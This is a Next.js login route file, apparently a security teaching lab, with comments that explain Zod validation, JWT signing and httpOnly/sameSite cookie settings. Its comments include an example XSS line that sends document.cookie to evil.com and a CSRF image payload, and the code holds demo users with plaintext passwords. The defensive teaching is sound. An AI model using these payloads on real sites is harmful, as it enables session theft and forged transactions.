// app/api/login/route.ts

import { SignJWT } from "jose";
import { cookies } from "next/headers";
import { z } from "zod";

/**
 * =============================================================================
 * INPUT VALIDATION WITH ZOD
 * =============================================================================
 *
 * KEY INTERVIEW TALKING POINTS:
 *
 * WHY VALIDATE INPUT ON THE SERVER?
 * ---------------------------------------------------------------------------
 * - Client-side validation can be bypassed (DevTools, curl, Postman)
 * - Never trust user input — always validate server-side
 * - Prevents injection attacks, malformed data, and crashes
 *
 * WHY ZOD?
 * ---------------------------------------------------------------------------
 * - TypeScript-first: Schema inference gives you type safety
 * - Runtime validation: Catches issues at runtime, not just compile time
 * - Detailed errors: Provides specific error messages per field
 * - Composable: Build complex schemas from simple ones
 *
 * SECURITY BENEFITS:
 * ---------------------------------------------------------------------------
 * - Enforces data shape before it reaches business logic
 * - Prevents SQL injection by validating types/formats
 * - Limits input length to prevent DoS attacks (e.g., password max length)
 * - Email validation prevents malformed data from polluting your database
 */

const loginSchema = z.object({
  email: z
    .string({ error: "Email is required" })
    .email("Invalid email format")
    .max(255, "Email too long"), // Prevent excessively long inputs

  password: z
    .string({ error: "Password is required" })
    .min(1, "Password is required")
    .max(128, "Password too long"), // Prevent DoS via huge passwords
});

/**
 * =============================================================================
 * SECURITY LAB: Secure Cookie-Based Authentication
 * =============================================================================
 *
 * KEY INTERVIEW TALKING POINTS:
 *
 * 1. WHY httpOnly PREVENTS JAVASCRIPT ACCESS
 * ---------------------------------------------------------------------------
 *    - When httpOnly is set to true, the browser BLOCKS JavaScript from
 *      accessing the cookie via document.cookie or any DOM API
 *    - This is critical for XSS (Cross-Site Scripting) protection because
 *      even if an attacker injects malicious JavaScript into your page,
 *      they CANNOT steal the session token
 *    - Without httpOnly, an XSS attack could do:
 *        fetch('https://evil.com/steal?cookie=' + document.cookie)
 *    - The cookie is still sent automatically with every HTTP request,
 *      so your app works normally—it's just invisible to JavaScript
 *
 * 2. HOW sameSite MITIGATES CSRF
 * ---------------------------------------------------------------------------
 *    - CSRF (Cross-Site Request Forgery) occurs when a malicious site tricks
 *      a user's browser into making authenticated requests to your site
 *    - Example attack: <img src="https://bank.com/transfer?to=attacker&amount=1000">
 *    - sameSite controls when cookies are sent with cross-origin requests:
 *
 *      • 'strict' - Cookie is NEVER sent on cross-site requests
 *                   Most secure, but breaks legitimate use cases like
 *                   clicking a link to your site from an email
 *
 *      • 'lax'    - Cookie is sent on top-level navigations (clicking links)
 *                   but NOT on cross-site POST requests, form submissions,
 *                   or fetch/XHR calls. This is the sweet spot.
 *
 *      • 'none'   - Cookie is always sent (requires secure: true)
 *                   Only use for legitimate cross-site scenarios (OAuth, embeds)
 *
 * 3. WHY SECRETS SHOULD NEVER BE IN CLIENT-SIDE CODE
 * ---------------------------------------------------------------------------
 *    - Client-side code (browser JavaScript) is FULLY VISIBLE to users
 *    - Anyone can open DevTools → Sources and see all your code
 *    - Environment variables prefixed with NEXT_PUBLIC_ are bundled into
 *      the client JavaScript bundle—visible to everyone
 *    - JWT_SECRET must stay server-side because:
 *      • If exposed, attackers can forge their own valid JWTs
 *      • They could impersonate any user, including admins
 *      • Your entire authentication system is compromised
 *    - This route runs ONLY on the server (Route Handlers are server-only),
 *      so process.env.JWT_SECRET is never exposed to the browser
 */

/**
 * =============================================================================
 * MOCK AUTHENTICATION (For Testing/Demo Only)
 * =============================================================================
 *
 * In production, you would:
 * 1. Query the database for the user by email
 * 2. Use bcrypt.compare() to verify the password against the stored hash
 * 3. Never store plaintext passwords!
 *
 * Example production code:
 *   const user = await db.user.findUnique({ where: { email } });
 *   if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
 *     return Response.json({ error: 'Invalid credentials' }, { status: 401 });
 *   }
 */

// Mock user database (NEVER do this in production!)
const MOCK_USERS = [
  { email: "admin@test.com", password: "admin123", role: "admin" },
  { email: "user@test.com", password: "user123", role: "user" },
];

async function validateCredentials(email: string, password: string) {
  // Simulate database lookup delay
  await new Promise((resolve) => setTimeout(resolve, 100));

  const user = MOCK_USERS.find(
    (u) => u.email === email && u.password === password
  );

  return user || null;
}

export async function POST(request: Request) {
  /**
   * STEP 1: Parse and validate input with Zod
   * ------------------------------------------
   * safeParse() returns { success, data, error } instead of throwing
   * This gives us control over the error response format
   */
  const body = await request.json();
  const validation = loginSchema.safeParse(body);

  if (!validation.success) {
    // Return structured validation errors
    // Zod's flatten() gives us a clean { fieldErrors, formErrors } shape
    return Response.json(
      {
        error: "Validation failed",
        details: validation.error.flatten().fieldErrors,
      },
      { status: 400 }
    );
  }

  // TypeScript now knows email & password are valid strings
  const { email, password } = validation.data;

  // Validate credentials against mock database
  const user = await validateCredentials(email, password);

  if (!user) {
    // Security note: Use generic message to prevent user enumeration
    // Don't say "user not found" vs "wrong password" — that reveals info
    return Response.json(
      { error: "Invalid email or password" },
      { status: 401 }
    );
  }

  /**
   * JWT SIGNING (Server-Side Only)
   * --------------------------------
   * The JWT_SECRET is used to cryptographically sign the token.
   * This signature proves the token was created by our server and hasn't
   * been tampered with. The secret MUST remain on the server.
   */
  const token = await new SignJWT({ email, role: user.role })
    .setProtectedHeader({ alg: "HS256" })
    .setExpirationTime("24h")
    .sign(new TextEncoder().encode(process.env.JWT_SECRET));

  /**
   * SECURE COOKIE CONFIGURATION
   * --------------------------------
   * Each option here serves a specific security purpose.
   */
  (await cookies()).set("session", token, {
    // httpOnly: true
    // → Prevents document.cookie access from JavaScript
    // → Mitigates XSS token theft—even if attacker injects script,
    //   they cannot read or exfiltrate the session cookie
    httpOnly: true,

    // secure: true (in production)
    // → Cookie only sent over HTTPS connections
    // → Prevents token interception via man-in-the-middle attacks
    // → Set to false in development for localhost (http://)
    secure: process.env.NODE_ENV === "production",

    // sameSite: 'lax'
    // → Cookie sent on same-site requests and top-level navigations
    // → Blocks cross-site POST/fetch requests from including cookie
    // → Prevents CSRF attacks while allowing normal link navigation
    sameSite: "lax",

    // maxAge: 86400 (24 hours in seconds)
    // → Cookie expires after 24 hours
    // → Limits window of exposure if token is somehow compromised
    maxAge: 86_400,
  });

  return Response.json({
    success: true,
    user: { email: user.email, role: user.role },
  });
}
